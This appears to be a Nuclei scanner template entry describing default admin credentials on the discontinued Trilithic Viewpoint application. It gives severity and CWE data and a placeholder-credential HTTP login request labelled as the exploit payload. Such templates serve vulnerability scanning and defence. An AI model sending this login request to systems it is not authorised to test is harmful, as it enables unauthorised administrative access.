# Nuclei Template: Trilithic Viewpoint Default Login
**Template ID:** trilithic-viewpoint-default
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`trilithic-viewpoint-login.yaml`)

## Vulnerability Information & PoC

## Description
Trilithic Viewpoint application default admin credentials were discovered. Note this product has been discontinued.

## Steps to reproduce / Exploit Payload
```http
POST /ViewPoint/admin/Site/ViewPointLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Cookie: trilithic_win_auth=false

{u:"{{username}}", t:"undefined", p:"{{password}}", d:"", r:false, w:false}
```

